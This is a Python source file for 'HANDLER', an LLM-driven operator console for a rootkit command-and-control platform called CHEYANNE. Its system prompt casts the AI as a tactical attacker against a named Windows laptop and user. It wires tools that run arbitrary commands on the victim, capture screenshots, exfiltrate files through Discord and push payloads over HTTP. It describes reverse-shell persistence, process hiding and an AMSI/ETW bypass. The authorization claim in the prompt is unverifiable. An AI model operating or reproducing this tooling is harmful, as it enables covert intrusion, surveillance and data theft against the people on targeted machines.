"""
cheyanne_agent.py — AI-Powered C2 Operator (HANDLER)
22DIV / george wu

Chat with an AI that knows Cheyanne inside out.
Runs recon, screenshots, file ops, config changes — all through conversation.

Backend: Ollama (local, default) or Claude API (--claude)
Tools: cheyanne_ops.py

Usage:
    python cheyanne_agent.py                      # Ollama
    python cheyanne_agent.py --model coding       # specific Ollama model
    python cheyanne_agent.py --claude              # Claude API (needs ANTHROPIC_API_KEY)

Menu: CHEYANNE > H
"""

import os
import sys
import json
import time
import subprocess
import threading
import urllib.request
import urllib.error

ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, ROOT)

from cheyanne_ops import (
    get_sessions, send_command, poll_output, poll_attachment,
    download_url, convert_bmp_to_png, op_sessions, op_recon,
    CFG, SCREENSHOTS_DIR, EXFIL_DIR,
)

if sys.platform == "win32":
    os.system("")
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

GRN = "\033[38;2;0;255;65m"
RED = "\033[38;2;255;68;68m"
AMB = "\033[38;2;255;176;0m"
CYN = "\033[38;2;0;229;255m"
PNK = "\033[38;2;255;45;138m"
DIM = "\033[38;2;85;85;85m"
WHT = "\033[38;2;255;255;255m"
BLD = "\033[1m"
RST = "\033[0m"

# ══════════════════════════════════════════════════════════════
# SYSTEM PROMPT — everything the agent needs to know
# ══════════════════════════════════════════════════════════════

SYSTEM_PROMPT = """You are HANDLER — an AI operator for the CHEYANNE rootkit C2 platform.
You are running on George Wu's machine (192.168.1.92). You operate targets through Discord C2.

CURRENT TARGET: Radon_Laptop1 (192.168.1.145) — user "Ghaleb Jomma", Windows 11, user-level access only.
AUTHORIZATION: Raed (machine owner) authorized all attacks. Academic CSEC research.

YOUR CAPABILITIES (use tools):
- List active implant sessions
- Take screenshots of target screen
- Browse files on target (dir any path)
- Exfiltrate files from target (target uploads to Discord, you download)
- Upload files to target (you serve via HTTP, target downloads)
- Run any command on target (cmd, powershell, recon)
- Run recon enumeration
- Compile/mutate/scan rootkit components locally

CHEYANNE ARCHITECTURE:
- TCP reverse shell on port 4443 (persistent via HKCU Run key)
- Discord beacon (heartbeat + commands via webhook/bot API)
- Python implant (svchost_update.exe) supports: SCREENSHOT, UPLOAD, DOWNLOAD, PERSIST, RECON, any shell command
- C beacon (svchost_health.exe) is heartbeat-only, no interactive commands
- Cloak DLL hides processes + ports from GUI apps (CBT hook)
- Dark Room = AMSI + ETW bypass (HWBP technique)
- Ghost encoder = steganographic payload delivery

OPSEC RULES:
- User-level only on Radon. No admin escalation attempted.
- All file transfer goes through Discord (<8MB) or HTTP staging
- Never delete files on target without explicit permission
- Never run destructive commands without asking first
- Keep operations quiet — avoid noisy scans

PERSONALITY:
- You're a tactical operator. Direct, concise, no fluff.
- Suggest next moves after completing tasks.
- If something fails, diagnose and offer alternatives.
- You can plan multi-step operations (recon → identify targets → exfil).

When the user asks you to do something, use the appropriate tool. You can chain multiple tools.
Always report what you found and suggest next steps."""

# ══════════════════════════════════════════════════════════════
# TOOL DEFINITIONS
# ══════════════════════════════════════════════════════════════

TOOLS_SCHEMA = [
    {
        "type": "function",
        "function": {
            "name": "list_sessions",
            "description": "List all active implant sessions on targets. Returns session IDs, hostnames, users, IPs.",
            "parameters": {"type": "object", "properties": {}, "required": []}
        }
    },
    {
        "type": "function",
        "function": {
            "name": "screenshot",
            "description": "Capture a screenshot of the target's screen. Sends SCREENSHOT command to Discord implant, waits for upload, downloads and converts to PNG.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_id": {"type": "string", "description": "Target session ID (first few chars enough). Leave empty to auto-select if only one session."}
                },
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "browse_files",
            "description": "List files in a directory on the target machine.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_id": {"type": "string", "description": "Target session ID"},
                    "path": {"type": "string", "description": "Directory path to list, e.g. C:\\Users"}
                },
                "required": ["path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "exfil_file",
            "description": "Exfiltrate/download a file FROM the target. The implant uploads it to Discord, then we download it locally.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_id": {"type": "string", "description": "Target session ID"},
                    "remote_path": {"type": "string", "description": "Full path to file on target"}
                },
                "required": ["remote_path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "upload_file",
            "description": "Upload a file TO the target. Serves file via HTTP, sends DOWNLOAD command to implant.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_id": {"type": "string", "description": "Target session ID"},
                    "local_path": {"type": "string", "description": "Path to file on our machine"},
                    "remote_path": {"type": "string", "description": "Destination path on target"}
                },
                "required": ["local_path", "remote_path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_command",
            "description": "Execute any shell command on the target via Discord C2. Use for recon, enumeration, or any cmd/powershell command.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_id": {"type": "string", "description": "Target session ID"},
                    "command": {"type": "string", "description": "Command to execute (cmd or powershell)"}
                },
                "required": ["command"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "recon",
            "description": "Run full reconnaissance on target: whoami, privileges, network config, users, AV status, installed software.",
            "parameters": {
                "type": "object",
                "properties": {
                    "session_id": {"type": "string", "description": "Target session ID (optional, auto-selects)"}
                },
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "local_command",
            "description": "Run a command on the LOCAL operator machine (George's PC). For compiling, scanning, mutating rootkit components.",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {"type": "string", "description": "Command to run locally"}
                },
                "required": ["command"]
            }
        }
    },
]

# ══════════════════════════════════════════════════════════════
# TOOL EXECUTION
# ══════════════════════════════════════════════════════════════

def resolve_session(session_id=None):
    sessions = get_sessions()
    if not sessions:
        return None, "No active sessions found."
    if not session_id or session_id == "":
        if len(sessions) == 1:
            return list(sessions.keys())[0], None
        return None, f"Multiple sessions: {', '.join(sessions.keys())}. Specify one."
    for sid in sessions:
        if sid.startswith(session_id):
            return sid, None
    return None, f"Session {session_id} not found."


def exec_tool(name, args):
    log_tool(name, args)

    if name == "list_sessions":
        sessions = get_sessions()
        if not sessions:
            return "No active sessions."
        lines = []
        for sid, s in sessions.items():
            lines.append(f"{sid} | {s['hostname']} | {s['user']} | {s['ip']}")
        return f"{len(sessions)} session(s):\n" + "\n".join(lines)

    elif name == "screenshot":
        sid, err = resolve_session(args.get("session_id"))
        if err:
            return err
        send_command(sid, "SCREENSHOT")
        att = poll_attachment(timeout=45)
        if not att:
            return "No screenshot received within 45s."
        os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
        ext = os.path.splitext(att["filename"])[1] or ".bmp"
        out = os.path.join(SCREENSHOTS_DIR, f"handler_{int(time.time())}{ext}")
        download_url(att["url"], out)
        if ext == ".bmp":
            png = convert_bmp_to_png(out)
            if png != out:
                out = png
        return f"Screenshot saved: {out} ({att['size']} bytes)"

    elif name == "browse_files":
        sid, err = resolve_session(args.get("session_id"))
        if err:
            return err
        path = args.get("path", "C:\\Users")
        send_command(sid, f'dir /b /o:gn "{path}"')
        output = poll_output(sid, timeout=20)
        return output or f"No response listing {path}"

    elif name == "exfil_file":
        sid, err = resolve_session(args.get("session_id"))
        if err:
            return err
        remote = args.get("remote_path", "")
        if not remote:
            return "No remote_path specified."
        send_command(sid, f"UPLOAD {remote}")
        att = poll_attachment(timeout=45)
        if not att:
            output = poll_output(sid, timeout=5)
            return output or f"No file received for {remote}"
        os.makedirs(EXFIL_DIR, exist_ok=True)
        out = os.path.join(EXFIL_DIR, att["filename"])
        download_url(att["url"], out)
        return f"Exfiltrated: {out} ({att['size']} bytes)"

    elif name == "upload_file":
        sid, err = resolve_session(args.get("session_id"))
        if err:
            return err
        local = args.get("local_path", "")
        remote = args.get("remote_path", "")
        if not os.path.isfile(local):
            return f"Local file not found: {local}"
        import socket as _s
        import http.server, functools
        try:
            s = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            my_ip = s.getsockname()[0]
            s.close()
        except Exception:
            return "Cannot detect local IP."
        port = 8891
        serve_dir = os.path.dirname(os.path.abspath(local))
        handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=serve_dir)
        srv = http.server.HTTPServer(("0.0.0.0", port), handler)
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        url = f"http://{my_ip}:{port}/{os.path.basename(local)}"
        send_command(sid, f"DOWNLOAD {url} {remote}")
        output = poll_output(sid, timeout=25)
        srv.shutdown()
        return output or f"Upload command sent. File: {url} → {remote}"

    elif name == "run_command":
        sid, err = resolve_session(args.get("session_id"))
        if err:
            return err
        cmd = args.get("command", "")
        if not cmd:
            return "No command specified."
        send_command(sid, cmd)
        output = poll_output(sid, timeout=25)
        return output or "Command sent, no output received (may still be running)."

    elif name == "recon":
        sid, err = resolve_session(args.get("session_id"))
        if err:
            return err
        send_command(sid, "RECON")
        output = poll_output(sid, timeout=30)
        return output or "No recon response."

    elif name == "local_command":
        cmd = args.get("command", "")
        if not cmd:
            return "No command."
        blocked = ["rm -rf", "del /s", "format ", "rmdir /s"]
        if any(b in cmd.lower() for b in blocked):
            return "Blocked: destructive command."
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                             timeout=30, cwd=ROOT)
            return (r.stdout + r.stderr).strip() or "(no output)"
        except subprocess.TimeoutExpired:
            return "Command timed out (30s)."

    return f"Unknown tool: {name}"


def log_tool(name, args):
    args_str = ", ".join(f"{k}={v}" for k, v in args.items()) if args else ""
    print(f"  {AMB}  ⚡ {name}({args_str}){RST}")


# ══════════════════════════════════════════════════════════════
# OLLAMA BACKEND
# ══════════════════════════════════════════════════════════════

TOOL_PROMPT_SUFFIX = """

TOOL FORMAT — when you need to use a tool, output EXACTLY this format (one tool per block):
<tool>
{"name": "TOOL_NAME", "args": {"param": "value"}}
</tool>

Available tools:
- list_sessions() — list active implant sessions
- screenshot(session_id?) — capture target screen
- browse_files(session_id?, path) — list directory on target
- exfil_file(session_id?, remote_path) — pull file from target
- upload_file(session_id?, local_path, remote_path) — push file to target
- run_command(session_id?, command) — execute shell command on target
- recon(session_id?) — full target enumeration
- local_command(command) — run command on THIS machine (operator's PC)

RULES:
- Use <tool> blocks for actions. Text outside blocks is your spoken response.
- You can use multiple <tool> blocks in one response.
- After tool results are shown, analyze them and suggest next steps.
- session_id is optional if there's only one active session."""


class OllamaBackend:
    def __init__(self, model="krith/mistral-nemo-instruct-2407-abliterated:IQ4_XS"):
        self.model = model
        self.base = self._find_ollama()
        self.messages = [{"role": "system", "content": SYSTEM_PROMPT + TOOL_PROMPT_SUFFIX}]

    @staticmethod
    def _find_ollama():
        for host in ["127.0.0.1", "192.168.1.92", "localhost"]:
            url = f"http://{host}:11434"
            try:
                urllib.request.urlopen(f"{url}/api/tags", timeout=2)
                return url
            except Exception:
                pass
        return "http://127.0.0.1:11434"

    def _call_ollama(self):
        payload = {
            "model": self.model,
            "messages": self.messages,
            "stream": False,
        }
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            f"{self.base}/api/chat", data=data,
            headers={"Content-Type": "application/json"}
        )
        resp = urllib.request.urlopen(req, timeout=120)
        result = json.loads(resp.read().decode("utf-8"))
        return result.get("message", {}).get("content", "")

    def _parse_tools(self, text):
        import re
        tool_blocks = re.findall(r'<tool>\s*(.*?)\s*</tool>', text, re.DOTALL)
        calls = []
        for block in tool_blocks:
            try:
                data = json.loads(block)
                calls.append((data.get("name", ""), data.get("args", {})))
            except json.JSONDecodeError:
                pass
        clean = re.sub(r'<tool>.*?</tool>', '', text, flags=re.DOTALL).strip()
        return calls, clean

    def chat(self, user_msg):
        self.messages.append({"role": "user", "content": user_msg})

        for _round in range(3):
            try:
                content = self._call_ollama()
            except Exception as e:
                return f"[OLLAMA ERROR] {e}"

            tool_calls, text = self._parse_tools(content)

            if not tool_calls:
                self.messages.append({"role": "assistant", "content": content})
                return content

            results = []
            for name, args in tool_calls:
                result = exec_tool(name, args)
                print(f"  {DIM}  → {result[:300]}{RST}")
                results.append(f"[{name}] {result}")

            self.messages.append({"role": "assistant", "content": content})
            self.messages.append({"role": "user", "content": "Tool results:\n" + "\n".join(results) + "\n\nAnalyze the results and respond."})

        return text or content


# ══════════════════════════════════════════════════════════════
# KIMI / OPENROUTER BACKEND (OpenAI-compatible, fast API)
# ══════════════════════════════════════════════════════════════

class KimiBackend:
    def __init__(self, model="moonshotai/kimi-k2.5"):
        self.model = model
        self.api_key = os.environ.get("OPENROUTER_API_KEY", "")
        if not self.api_key:
            dotenv = os.path.join(os.environ.get("LOCALAPPDATA", ""), "hermes", ".env")
            if os.path.exists(dotenv):
                with open(dotenv, "r") as f:
                    for line in f:
                        if line.startswith("OPENROUTER_API_KEY="):
                            self.api_key = line.split("=", 1)[1].strip().strip('"').strip("'")
                            break
        self.base = "https://openrouter.ai/api/v1"
        self.messages = [{"role": "system", "content": SYSTEM_PROMPT + TOOL_PROMPT_SUFFIX}]

    def _call_api(self):
        payload = {
            "model": self.model,
            "messages": self.messages,
        }
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            f"{self.base}/chat/completions", data=data,
            headers={
                "Content-Type": "application/json",
                "Authorization": f"Bearer {self.api_key}",
            }
        )
        resp = urllib.request.urlopen(req, timeout=60)
        result = json.loads(resp.read().decode("utf-8"))
        return result.get("choices", [{}])[0].get("message", {}).get("content", "")

    def _parse_tools(self, text):
        import re
        tool_blocks = re.findall(r'<tool>\s*(.*?)\s*</tool>', text, re.DOTALL)
        calls = []
        for block in tool_blocks:
            try:
                data = json.loads(block)
                calls.append((data.get("name", ""), data.get("args", {})))
            except json.JSONDecodeError:
                pass
        clean = re.sub(r'<tool>.*?</tool>', '', text, flags=re.DOTALL).strip()
        return calls, clean

    def chat(self, user_msg):
        self.messages.append({"role": "user", "content": user_msg})

        for _round in range(3):
            try:
                content = self._call_api()
            except Exception as e:
                return f"[API ERROR] {e}"

            tool_calls, text = self._parse_tools(content)

            if not tool_calls:
                self.messages.append({"role": "assistant", "content": content})
                return content

            results = []
            for name, args in tool_calls:
                result = exec_tool(name, args)
                print(f"  {DIM}  → {result[:300]}{RST}")
                results.append(f"[{name}] {result}")

            self.messages.append({"role": "assistant", "content": content})
            self.messages.append({"role": "user", "content": "Tool results:\n" + "\n".join(results) + "\n\nAnalyze the results and respond."})

        return text or content


# ══════════════════════════════════════════════════════════════
# CLAUDE BACKEND
# ══════════════════════════════════════════════════════════════

class ClaudeBackend:
    def __init__(self):
        self.api_key = os.environ.get("ANTHROPIC_API_KEY", "")
        self.messages = []
        self.claude_tools = []
        for t in TOOLS_SCHEMA:
            fn = t["function"]
            self.claude_tools.append({
                "name": fn["name"],
                "description": fn["description"],
                "input_schema": fn["parameters"],
            })

    def chat(self, user_msg):
        self.messages.append({"role": "user", "content": user_msg})

        while True:
            payload = {
                "model": "claude-sonnet-4-6",
                "max_tokens": 4096,
                "system": SYSTEM_PROMPT,
                "messages": self.messages,
                "tools": self.claude_tools,
            }
            data = json.dumps(payload).encode("utf-8")
            req = urllib.request.Request(
                "https://api.anthropic.com/v1/messages", data=data,
                headers={
                    "Content-Type": "application/json",
                    "x-api-key": self.api_key,
                    "anthropic-version": "2023-06-01",
                }
            )
            try:
                resp = urllib.request.urlopen(req, timeout=120)
                result = json.loads(resp.read().decode("utf-8"))
            except urllib.error.HTTPError as e:
                body = e.read().decode("utf-8", errors="replace")
                return f"[CLAUDE ERROR {e.code}] {body[:200]}"
            except Exception as e:
                return f"[CLAUDE ERROR] {e}"

            stop = result.get("stop_reason", "end_turn")
            content_blocks = result.get("content", [])

            text_parts = []
            tool_uses = []
            for block in content_blocks:
                if block["type"] == "text":
                    text_parts.append(block["text"])
                elif block["type"] == "tool_use":
                    tool_uses.append(block)

            if not tool_uses:
                full_text = "\n".join(text_parts)
                self.messages.append({"role": "assistant", "content": content_blocks})
                return full_text

            self.messages.append({"role": "assistant", "content": content_blocks})

            tool_results = []
            for tu in tool_uses:
                name = tu["name"]
                args = tu["input"]
                result_str = exec_tool(name, args)
                print(f"  {DIM}  → {result_str[:200]}{RST}")
                tool_results.append({
                    "type": "tool_result",
                    "tool_use_id": tu["id"],
                    "content": str(result_str),
                })

            self.messages.append({"role": "user", "content": tool_results})


# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════

def banner():
    print(f"""
  {CYN}{BLD}╔══════════════════════════════════════════════════════╗
  ║  HANDLER — AI-Powered C2 Operator                    ║
  ║  22DIV / george wu                                   ║
  ╚══════════════════════════════════════════════════════╝{RST}

  {DIM}  Talk naturally. HANDLER runs the tools.{RST}
  {DIM}  "take a screenshot"  "list files on desktop"  "run whoami"{RST}
  {DIM}  "exfil that file"    "what's running on target"  "recon"{RST}

  {DIM}  Type 'exit' to quit.{RST}
""")


def main():
    model = "krith/mistral-nemo-instruct-2407-abliterated:IQ4_XS"
    backend_type = "ollama"

    for i, arg in enumerate(sys.argv[1:]):
        if arg == "--claude":
            backend_type = "claude"
        elif arg == "--kimi":
            backend_type = "kimi"
        elif arg == "--model" and i + 1 < len(sys.argv[1:]):
            model = sys.argv[i + 2]
        elif not arg.startswith("--"):
            model = arg

    banner()

    if backend_type == "claude":
        api_key = os.environ.get("ANTHROPIC_API_KEY", "")
        if not api_key:
            print(f"  {RED}  [!] ANTHROPIC_API_KEY not set{RST}")
            print(f"  {DIM}  set ANTHROPIC_API_KEY=sk-ant-...{RST}")
            return
        backend = ClaudeBackend()
        print(f"  {GRN}  [+] Backend: Claude API (sonnet-4-6){RST}\n")
    elif backend_type == "kimi":
        backend = KimiBackend()
        if not backend.api_key:
            print(f"  {RED}  [!] OPENROUTER_API_KEY not set{RST}")
            print(f"  {DIM}  Set env var or add to %LOCALAPPDATA%\\hermes\\.env{RST}")
            return
        print(f"  {GRN}  [+] Backend: Kimi K2.5 via OpenRouter{RST}")
        print(f"  {DIM}  Key: ...{backend.api_key[-8:]}{RST}\n")
    else:
        backend = OllamaBackend(model)
        print(f"  {GRN}  [+] Backend: Ollama ({model}){RST}")
        try:
            urllib.request.urlopen(f"{backend.base}/api/tags", timeout=5)
            print(f"  {GRN}  [+] Ollama: connected ({backend.base}){RST}\n")
        except Exception:
            print(f"  {RED}  [!] Ollama not running — start with: ollama serve{RST}")
            return

    # show active sessions on startup
    sessions = get_sessions()
    if sessions:
        print(f"  {GRN}  [+] {len(sessions)} active session(s):{RST}")
        for sid, s in sessions.items():
            print(f"  {DIM}      {sid} — {s['hostname']} ({s['ip']}){RST}")
        print()
    else:
        print(f"  {AMB}  [*] No active sessions — deploy an implant first{RST}\n")

    while True:
        try:
            user_input = input(f"  {PNK}handler>{RST} ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not user_input:
            continue
        if user_input.lower() in ("exit", "quit", "q"):
            break

        print()
        try:
            response = backend.chat(user_input)
            if response:
                for line in response.strip().split("\n"):
                    print(f"  {CYN}  {line}{RST}")
            print()
        except KeyboardInterrupt:
            print(f"\n  {DIM}  [interrupted]{RST}\n")
        except Exception as e:
            print(f"  {RED}  [ERROR] {e}{RST}\n")


if __name__ == "__main__":
    main()
